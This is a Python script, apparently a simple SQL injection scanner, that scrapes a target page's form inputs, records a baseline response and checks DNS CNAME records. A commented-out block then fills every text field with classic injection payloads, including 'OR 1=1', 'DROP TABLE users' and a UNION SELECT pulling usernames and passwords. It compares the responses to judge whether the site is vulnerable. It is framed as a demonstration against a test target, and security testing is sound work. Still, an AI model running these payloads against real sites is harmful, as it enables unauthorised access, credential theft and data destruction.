
import requests
from bs4 import BeautifulSoup
import dns.resolver

TARGET_URL = "https://example.com"  # Replace with your test target


def extract_form_inputs(url: str):
    """
    Retrieves all <input> elements from a webpage.

    :param url: The URL to fetch and parse.
    :return: A list of <input> tags if found, otherwise None.
    """
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            print(f"Warning: Received status code {response.status_code} from {url}")
            return None

        soup = BeautifulSoup(response.content, "html.parser")
        inputs = soup.find_all("input")
        return inputs if inputs else None

    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None


def test_sql_injection():
    """
    Demonstrates naive SQL injection attempts against form inputs:

    1. Fetch form inputs and submit a valid payload to get an 'expected' response.
    2. Retrieve and display any CNAME records for the target domain.
    3. (Commented out) Attempt multiple naive SQL injection payloads.
    """
    form_inputs = extract_form_inputs(TARGET_URL)
    if not form_inputs:
        print("No form inputs identified.")
        return

    print(f"Discovered {len(form_inputs)} input field(s) at {TARGET_URL}.")

    # Step 1: Obtain a normal/valid response to compare against
    # We'll just post a single field from the first input as a demonstration
    valid_input_payload = "VALID_INPUT_EXAMPLE"
    first_input_name = form_inputs[0].get("name", "unnamed_input")
    try:
        response_valid = requests.post(
            TARGET_URL,
            data={first_input_name: valid_input_payload},
            timeout=10
        )
        expected_output = response_valid.text
        print("\n[INFO] Received valid response. Storing for comparison...")
    except requests.RequestException as e:
        print(f"Error submitting valid input to {TARGET_URL}: {e}")
        return

    # Step 2: Retrieve and print CNAME records (if any)
    # Replace "https://" or "http://" from the domain before querying DNS
    domain_for_dns = TARGET_URL.replace("https://", "").replace("http://", "").split('/')[0]
    try:
        answers = dns.resolver.resolve(domain_for_dns, 'CNAME')
        for rdata in answers:
            print(f"[DNS] CNAME record found: {rdata.target}")
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers) as e:
        print(f"[DNS] No CNAME record or DNS issue for {domain_for_dns}: {e}")

    # Display a snippet of the valid response (for debugging)
    print("\n[INFO] Expected (valid) response snippet:")
    print(f"{expected_output[:200]} ...")  # print the first 200 chars

    # -----------------------------------------------------------
    # Step 3: (Commented Out) Multiple Naive SQL Injection Attempts
    # -----------------------------------------------------------
    """
    # Common naive SQL injection payloads
    # These are for demonstration and likely won't work on secure applications.
    sql_injection_payloads = [
        "' OR 1=1 --", 
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "admin' --",
        "'; DROP TABLE users; --",
        "1234' UNION SELECT NULL,NULL--",
        "' UNION SELECT username, password FROM users --"
    ]

    for payload in sql_injection_payloads:
        print(f"\n[TEST] Attempting injection with payload: {payload}")
        injection_data = {}
        
        # Populate all text-type input fields with the injection payload
        for index, input_tag in enumerate(form_inputs):
            input_type = input_tag.get("type", "").lower()
            input_name = input_tag.get("name") or input_tag.get("id") or f"input_{index}"
            
            # We'll just handle 'text' inputs in this naive example.
            if "text" in input_type or input_type == "":
                injection_data[input_name] = payload
        
        try:
            response_injection = requests.post(TARGET_URL, data=injection_data, timeout=10)
            
            # Compare the new response to the 'expected' normal response
            if expected_output in response_injection.text:
                print("[RESULT] No change in response; injection seems unsuccessful or site not vulnerable.")
            else:
                print("[RESULT] Response changed; injection might have been successful!")
                print("Partial response content:")
                print(response_injection.text[:300], "...")
        
        except requests.RequestException as e:
            print(f"[ERROR] Injection attempt failed for payload '{payload}': {e}")
    """


if __name__ == "__main__":
    test_sql_injection()
